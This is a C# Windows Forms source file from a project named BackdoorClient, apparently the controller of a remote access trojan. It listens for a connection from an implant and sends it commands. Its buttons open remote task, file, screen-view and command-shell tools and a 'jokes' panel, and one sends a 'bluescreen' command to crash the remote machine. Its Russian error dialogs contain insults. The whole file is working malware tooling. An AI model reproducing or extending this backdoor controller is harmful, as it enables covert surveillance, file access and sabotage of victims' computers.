using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;

namespace BackdoorClient
{
    public enum MsgCodeMethod
    {
        UTF8,
        BASE64
    }
    public partial class Form1 : Form
    {
        private Socket sockSender = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            adressTextBox.Text = "127.0.0.1";
            portTextBox.Text = "7777";
        }

        private void ConnectButton_Click(object sender, EventArgs e)
        {
            try
            {
                Connect();
                connText.Text = "Подключено";
            }
            catch (Exception error)
            {
                connText.Text = "Ошибка не подключено";
            }
        }

        private void sendButton_Click(object sender, EventArgs e)
        {
            try
            {

                responseText.Text = SendCommandAndGetResponce(commandTextBox.Text);
            }
            catch (Exception error)
            {
                responseText.Text = error.Message;
            }
        }
        private void commandTextBox_TextEnter(object sender, EventArgs e)
        {

        }
        private async void Connect()
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(adressTextBox.Text), int.Parse(portTextBox.Text));
            sock.Bind(ipEndPoint);
            await Task.Run(() => sock.Listen(1));
            sockSender = sock.Accept();
            sock.Dispose();
        }

        public string SendCommandAndGetResponce(string comm, int maxsize = 10000, MsgCodeMethod codeMethod = MsgCodeMethod.UTF8)
        {
            byte[] bytes = new byte[maxsize];

            byte[] msg = new byte[1];
            msg = Encoding.UTF8.GetBytes(comm);
            commandTextBox.Text = "";
            try
            {
                sockSender.Send(msg);
            }
            catch (Exception e)
            {
                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return "";
            }

            int bytesRec = sockSender.Receive(bytes);

            if (codeMethod == MsgCodeMethod.UTF8)
                return Encoding.UTF8.GetString(bytes);
            if (codeMethod == MsgCodeMethod.BASE64)
                return Convert.ToBase64String(bytes);
            else
                throw new ArgumentException("code method invalid");
            //return Encoding.UTF8.GetString(bytes, 0, bytesRec);
        }

        public byte[] SendCommandAndGetBytesResponce(string comm, int maxsize = 10000)
        {
            byte[] bytes = new byte[maxsize];

            byte[] msg = new byte[1];
            msg = Encoding.UTF8.GetBytes(comm);
            commandTextBox.Text = "";
            try
            {
                sockSender.Send(msg);
            }
            catch (Exception e)
            {
                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return new byte[1];
            }

            int bytesRec = sockSender.Receive(bytes);

            return bytes;
        }

        public bool TestConnect()
        {
            if (sockSender == null) return false;
            else return sockSender.Connected;
        }

        private async void taskMgrButton_Click(object sender, EventArgs e)
        {
            var taskMgr = new TaskMgr(this);
            taskMgr.Show();
        }

        private void sendMesageBut_Click(object sender, EventArgs e)
        {
            var sendMsg = new SendMsg(this);
            sendMsg.Show();
        }

        private void filesManagerBut_Click(object sender, EventArgs e)
        {
            FileManager fileManager = new FileManager(this);
            fileManager.Show();
        }

        private void screenTraslBut_Click(object sender, EventArgs e)
        {
            ScreenViewSetings screenViewSetings = new ScreenViewSetings(this);
            screenViewSetings.Show();
        }

        private void crashSysButton_Click(object sender, EventArgs e)
        {
            if (!this.TestConnect())
            {
                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            var responce = MessageBox.Show("Внимание, вы точно хотите крашнуть уд. систему? Могут быть не обратимые последстивия", "Разраб проги", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (responce != DialogResult.Yes) return;
            SendCommandAndGetResponce("bluescreen");
        }

        private void jokesButton_Click(object sender, EventArgs e)
        {
            Jokes jokes = new Jokes(this);
            jokes.Show();
        }

        private void DisconnectBtn_Click(object sender, EventArgs e)
        {
            SendCommandAndGetResponce("abort connection");
    
            sockSender.Dispose();

            sockSender = null;
            connText.Text = "Не подключено";
        }

        private void CmdButton_Click(object sender, EventArgs e)
        {
            RemouteCmd remouteCmd = new RemouteCmd(this);
            remouteCmd.Show();
        }
    }
}
